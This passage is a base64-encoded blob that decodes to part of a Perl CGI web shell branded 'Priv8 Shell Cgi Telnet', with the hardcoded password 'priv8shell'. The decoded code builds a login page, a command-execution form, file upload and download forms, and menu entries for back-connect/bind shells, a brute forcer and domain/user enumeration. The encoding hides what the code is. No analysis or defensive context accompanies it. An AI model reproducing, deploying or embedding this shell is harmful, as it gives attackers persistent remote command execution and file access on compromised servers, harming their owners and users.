8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1jb21tYW5kJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5Db21tYW5kPC9hPiB8CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWd1aSZkPSRFbmNvZGVkQ3VycmVudERpciI+R1VJPC9hPiB8IAo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT11cGxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPlVwbG9hZCBGaWxlPC9hPiB8IAo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+RG93bmxvYWQgRmlsZTwvYT4gfAoKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9YmFja2JpbmQiPkJhY2sgJiBCaW5kPC9hPiB8CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWJydXRlZm9yY2VyIj5CcnV0ZSBGb3JjZXI8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y2hlY2tsb2ciPkNoZWNrIExvZzwvYT4gfAo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb21haW5zdXNlciI+RG9tYWlucy9Vc2VyczwvYT4gfAo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1sb2dvdXQiPkxvZ291dDwvYT4gfAo8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0iIyI+SGVscDwvYT4KCjwvZm9udD48L3RkPgo8L3RyPgo8L3RhYmxlPgo8Zm9udCBpZD0iUmVzcG9uc2VEYXRhIiBjb2xvcj0iI2ZmOTljYyIgPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9naW5TY3JlZW4KewoKCXByaW50IDw8RU5EOwo8cHJlPjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KVHlwaW5nVGV4dCA9IGZ1bmN0aW9uKGVsZW1lbnQsIGludGVydmFsLCBjdXJzb3IsIGZpbmlzaGVkQ2FsbGJhY2spIHsKICBpZigodHlwZW9mIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkID09ICJ1bmRlZmluZWQiKSB8fCAodHlwZW9mIGVsZW1lbnQuaW5uZXJIVE1MID09ICJ1bmRlZmluZWQiKSkgewogICAgdGhpcy5ydW5uaW5nID0gdHJ1ZTsJLy8gTmV2ZXIgcnVuLgogICAgcmV0dXJuOwogIH0KICB0aGlzLmVsZW1lbnQgPSBlbGVtZW50OwogIHRoaXMuZmluaXNoZWRDYWxsYmFjayA9IChmaW5pc2hlZENhbGxiYWNrID8gZmluaXNoZWRDYWxsYmFjayA6IGZ1bmN0aW9uKCkgeyByZXR1cm47IH0pOwogIHRoaXMuaW50ZXJ2YWwgPSAodHlwZW9mIGludGVydmFsID09ICJ1bmRlZmluZWQiID8gMTAwIDogaW50ZXJ2YWwpOwogIHRoaXMub3JpZ1RleHQgPSB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MOwogIHRoaXMudW5wYXJzZWRPcmlnVGV4dCA9IHRoaXMub3JpZ1RleHQ7CiAgdGhpcy5jdXJzb3IgPSAoY3Vyc29yID8gY3Vyc29yIDogIiIpOwogIHRoaXMuY3VycmVudFRleHQgPSAiIjsKICB0aGlzLmN1cnJlbnRDaGFyID0gMDsKICB0aGlzLmVsZW1lbnQudHlwaW5nVGV4dCA9IHRoaXM7CiAgaWYodGhpcy5lbGVtZW50LmlkID09ICIiKSB0aGlzLmVsZW1lbnQuaWQgPSAidHlwaW5ndGV4dCIgKyBUeXBpbmdUZXh0LmN1cnJlbnRJbmRleCsrOwogIFR5cGluZ1RleHQuYWxsLnB1c2godGhpcyk7CiAgdGhpcy5ydW5uaW5nID0gZmFsc2U7CiAgdGhpcy5pblRhZyA9IGZhbHNlOwogIHRoaXMudGFnQnVmZmVyID0gIiI7CiAgdGhpcy5pbkhUTUxFbnRpdHkgPSBmYWxzZTsKICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgPSAiIjsKfQpUeXBpbmdUZXh0LmFsbCA9IG5ldyBBcnJheSgpOwpUeXBpbmdUZXh0LmN1cnJlbnRJbmRleCA9IDA7ClR5cGluZ1RleHQucnVuQWxsID0gZnVuY3Rpb24oKSB7CiAgZm9yKHZhciBpID0gMDsgaSA8IFR5cGluZ1RleHQuYWxsLmxlbmd0aDsgaSsrKSBUeXBpbmdUZXh0LmFsbFtpXS5ydW4oKTsKfQpUeXBpbmdUZXh0LnByb3RvdHlwZS5ydW4gPSBmdW5jdGlvbigpIHsKICBpZih0aGlzLnJ1bm5pbmcpIHJldHVybjsKICBpZih0eXBlb2YgdGhpcy5vcmlnVGV4dCA9PSAidW5kZWZpbmVkIikgewogICAgc2V0VGltZW91dCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJyIgKyB0aGlzLmVsZW1lbnQuaWQgKyAiJykudHlwaW5nVGV4dC5ydW4oKSIsIHRoaXMuaW50ZXJ2YWwpOwkvLyBXZSBoYXZlbid0IGZpbmlzaGVkIGxvYWRpbmcgeWV0LiAgSGF2ZSBwYXRpZW5jZS4KICAgIHJldHVybjsKICB9CiAgaWYodGhpcy5jdXJyZW50VGV4dCA9PSAiIikgdGhpcy5lbGVtZW50LmlubmVySFRNTCA9ICIiOwovLyAgdGhpcy5vcmlnVGV4dCA9IHRoaXMub3JpZ1RleHQucmVwbGFjZSgvPChbXjxdKSo+LywgIiIpOyAgICAgLy8gU3RyaXAgSFRNTCBmcm9tIHRleHQuCiAgaWYodGhpcy5jdXJyZW50Q2hhciA8IHRoaXMub3JpZ1RleHQubGVuZ3RoKSB7CiAgICBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiPCIgJiYgIXRoaXMuaW5UYWcpIHsKICAgICAgdGhpcy50YWdCdWZmZXIgPSAiPCI7CiAgICAgIHRoaXMuaW5UYWcgPSB0cnVlOwogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7CiAgICAgIHRoaXMucnVuKCk7CiAgICAgIHJldHVybjsKICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiPiIgJiYgdGhpcy5pblRhZykgewogICAgICB0aGlzLnRhZ0J1ZmZlciArPSAiPiI7CiAgICAgIHRoaXMuaW5UYWcgPSBmYWxzZTsKICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLnRhZ0J1ZmZlcjsKICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgICB0aGlzLnJ1bigpOwogICAgICByZXR1cm47CiAgICB9IGVsc2UgaWYodGhpcy5pblRhZykgewogICAgICB0aGlzLnRhZ0J1ZmZlciArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsKICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgICB0aGlzLnJ1bigpOwogICAgICByZXR1cm47CiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIiYiICYmICF0aGlzLmluSFRNTEVudGl0eSkgewogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgPSAiJiI7CiAgICAgIHRoaXMuaW5IVE1MRW50aXR5ID0gdHJ1ZTsKICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgICB0aGlzLnJ1bigpOwogICAgICByZXR1cm47CiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIjsiICYmIHRoaXMuaW5IVE1MRW50aXR5KSB7CiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciArPSAiOyI7CiAgICAgIHRoaXMuaW5IVE1MRW50aXR5ID0gZmFsc2U7CiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy5IVE1MRW50aXR5QnVmZmVyOwogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7CiAgICAgIHRoaXMucnVuKCk7CiAgICAgIHJldHVybjsKICAgIH0gZWxzZSBpZih0aGlzLmluSFRNTEVudGl0eSkgewogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIHsKICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsKICAgIH0KICAgIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgPSB0aGlzLmN1cnJlbnRUZXh0OwogICAgdGhpcy5lbGVtZW50LmlubmVySFRNTCArPSAodGhpcy5jdXJyZW50Q2hhciA8IHRoaXMub3JpZ1RleHQubGVuZ3RoIC0gMSA/ICh0eXBlb2YgdGhpcy5jdXJzb3IgPT0gImZ1bmN0aW9uIiA/IHRoaXMuY3Vyc29yKHRoaXMuY3VycmVudFRleHQpIDogdGhpcy5jdXJzb3IpIDogIiIpOwogICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgc2V0VGltZW91dCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJyIgKyB0aGlzLmVsZW1lbnQuaWQgKyAiJykudHlwaW5nVGV4dC5ydW4oKSIsIHRoaXMuaW50ZXJ2YWwpOwogIH0gZWxzZSB7Cgl0aGlzLmN1cnJlbnRUZXh0ID0gIiI7Cgl0aGlzLmN1cnJlbnRDaGFyID0gMDsKICAgICAgICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsKICAgICAgICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2soKTsKICB9Cn0KPC9zY3JpcHQ+CjwvcHJlPgoKPGZvbnQgc3R5bGU9ImZvbnQ6IDE1cHQgT3BlbiBTYW5zOyBjb2xvcjogcmVkOyI+WyBQcml2OCBTaGVsbCBDZ2kgVGVsbmV0IF08L2ZvbnQ+PGJyPjxmb250IHN0eWxlPSJmb250OiA4cHQgT3BlbiBTYW5zOyBjb2xvcjogcmVkOyI+UGFzc3dvcmQ6IHByaXY4c2hlbGwgPC9mb250Pjxicjxicj4KPHRhYmxlIGFsaWduPSJjZW50ZXIiIGJvcmRlcj0iMSIgd2lkdGg9IjYwMCIgaGVpZ2g+Cjx0Ym9keT48dHI+Cjx0ZCB2YWxpZ249InRvcCIgYmFja2dyb3VuZD0iaHR0cDovL2RsLmRyb3Bib3guY29tL3UvMTA4NjAwNTEvaW1hZ2VzL21hdHJhbi5naWYiPjxwIGlkPSJoYWNrIiBzdHlsZT0ibWFyZ2luLWxlZnQ6IDNweDsiPgo8Zm9udCBjb2xvcj0iI2ZmMTExMSI+IFBsZWFzZSBXYWl0IC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+IDxicj4KCjxmb250IGNvbG9yPSIjZmYxMTExIj4gVHJ5aW5nIGNvbm5lY3QgdG8gU2VydmVyIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPgo8Zm9udCBjb2xvcj0iI0YwMDAwMCI+PGZvbnQgY29sb3I9IiNmZjExMTEiPn5cJDwvZm9udD4gQ29ubmVjdGVkICEgPC9mb250Pjxicj4KPGZvbnQgY29sb3I9IiNmZjExMTEiPjxmb250IGNvbG9yPSIjZmYxMTExIj4kU2VydmVyTmFtZX48L2ZvbnQ+IENoZWNraW5nIFNlcnZlciAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuPC9mb250PiA8YnI+Cgo8Zm9udCBjb2xvcj0iI2ZmMTExMSI+PGZvbnQgY29sb3I9IiNmZjExMTEiPiRTZXJ2ZXJOYW1lfjwvZm9udD4gVHJ5aW5nIGNvbm5lY3QgdG8gQ29tbWFuZCAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPgoKPGZvbnQgY29sb3I9IiNGMDAwMDAiPjxmb250IGNvbG9yPSIjZmYxMTExIj4kU2VydmVyTmFtZX48L2ZvbnQ+XCQgQ29ubmVjdGVkIENvbW1hbmQhIDwvZm9udD48YnI+Cjxmb250IGNvbG9yPSIjZmYxMTExIj48Zm9udCBjb2xvcj0iI2ZmMTExMSI+JFNlcnZlck5hbWV+PGZvbnQgY29sb3I9IiNGMDAwMDAiPlwkPC9mb250PjwvZm9udD4gT0shIFlvdSBjYW4ga2lsbCBpdCE8L2ZvbnQ+CjwvdHI+CjwvdGJvZHk+PC90YWJsZT4KPGJyPgoKPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgpuZXcgVHlwaW5nVGV4dChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaGFjayIpLCAzMCwgZnVuY3Rpb24oaSl7IHZhciBhciA9IG5ldyBBcnJheSgiXyIsIiIpOyByZXR1cm4gIiAiICsgYXJbaS5sZW5ndGggJSBhci5sZW5ndGhdOyB9KTsKVHlwaW5nVGV4dC5ydW5BbGwoKTsKCjwvc2NyaXB0PgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEFkZCBodG1sIHNwZWNpYWwgY2hhcnMKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgSHRtbFNwZWNpYWxDaGFycygkKXsKCW15ICR0ZXh0ID0gc2hpZnQ7CgkkdGV4dCA9fiBzLyYvJmFtcDsvZzsKCSR0ZXh0ID1+IHMvIi8mcXVvdDsvZzsKCSR0ZXh0ID1+IHMvJy8mIzAzOTsvZzsKCSR0ZXh0ID1+IHMvPC8mbHQ7L2c7CgkkdGV4dCA9fiBzLz4vJmd0Oy9nOwoJcmV0dXJuICR0ZXh0Owp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBBZGQgbGluayBmb3IgZGlyZWN0b3J5CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEFkZExpbmtEaXIoJCkKewoJbXkgJGFjPXNoaWZ0OwoJbXkgQGRpcj0oKTsKCWlmKCRXaW5OVCkKCXsKCQlAZGlyPXNwbGl0KC9cXC8sJEN1cnJlbnREaXIpOwoJfWVsc2UKCXsKCQlAZGlyPXNwbGl0KCIvIiwmdHJpbSgkQ3VycmVudERpcikpOwoJfQoJbXkgJHBhdGg9IiI7CglteSAkcmVzdWx0PSIiOwoJZm9yZWFjaCAoQGRpcikKCXsKCQkkcGF0aCAuPSAkXy4kUGF0aFNlcDsKCQkkcmVzdWx0Lj0iPGEgaHJlZj0nP2E9Ii4kYWMuIiZkPSIuJHBhdGguIic+Ii4kXy4kUGF0aFNlcC4iPC9hPiI7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQp7CglwcmludCA8PEVORDsKPGJyPkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4KClBhc3N3b3JkOjxicj4KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSBmb3IgbG9nZ2luZyBpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRm9ybQp7CglwcmludCA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+CkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4KUGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4KPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRNTCBQYWdlCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50UGFnZUZvb3Rlcgp7CglwcmludCAiPC9jb2RlPjwvY2VudGVyPjwvYm9keT48L2h0bWw+IjsKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlCiMgdmFyaWFibGUgJENvb2tpZXN7J30KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgR2V0Q29va2llcwp7CglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOwoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykKCXsKCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7CgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9nb3V0U2NyZWVuCnsKCXByaW50ICJDb25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2FpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQZXJmb3JtTG9nb3V0CnsKCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUKCSZQcmludFBhZ2VIZWFkZXIoInAiKTsKCSZQcmludExvZ291dFNjcmVlbjsKCgkmUHJpbnRMb2dpblNjcmVlbjsKCSZQcmludExvZ2luRm9ybTsKCSZQcmludFBhZ2VGb290ZXI7CglleGl0Owp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9naW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdAojIGRpc3BsYXlzIGEgcGFnZSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBydW4gY29tbWFuZHMuIElmIHRoZSBwYXNzd29yZCBkb2Vucyd0CiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyCiMgdG8gbG9naW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUGVyZm9ybUxvZ2luIAp7CglpZigkTG9naW5QYXNzd29yZCBlcSAkUGFzc3dvcmQpICMgcGFzc3dvcmQgbWF0Y2hlZAoJewoJCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD0kTG9naW5QYXNzd29yZDtcbiI7CgkJJlByaW50UGFnZUhlYWRlcjsKCQlwcmludCAmTGlzdERpcjsKCX0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkJJlByaW50TG9naW5TY3JlZW47CgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZAoJCXsKCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOwoKCQl9CgkJJlByaW50TG9naW5Gb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJZXhpdDsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0KewoJbXkgJGRpcj0gIjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IE9wZW4gU2FuczsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz4iLiZBZGRMaW5rRGlyKCJjb21tYW5kIikuIjwvc3Bhbj4iOwoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nIyM2NmZmNjYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgokUHJvbXB0CjxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI1MCIgbmFtZT0iYyI+CjxpbnB1dCBjbGFzcz0ic3VibWl0InR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQp7CglteSAkZGlyID0gJkFkZExpbmtEaXIoImRvd25sb2FkIik7IAoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+CiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IGNsYXNzPSJmaWxlIiB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4KRG93bmxvYWQ6IDxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+Cgo8L2Zvcm0+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0KewoJbXkgJGRpcj0gJkFkZExpbmtEaXIoInVwbG9hZCIpOwoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CiRQcm9tcHQgdXBsb2FkPGJyPjxicj4KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+Ck9wdGlvbnM6ICZuYnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgaWQ9InVwIiB2YWx1ZT0ib3ZlcndyaXRlIj4KPGxhYmVsIGZvcj0idXAiPk92ZXJ3cml0ZSBpZiBpdCBFeGlzdHM8L2xhYmVsPjxicj48YnI+ClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgo8aW5wdX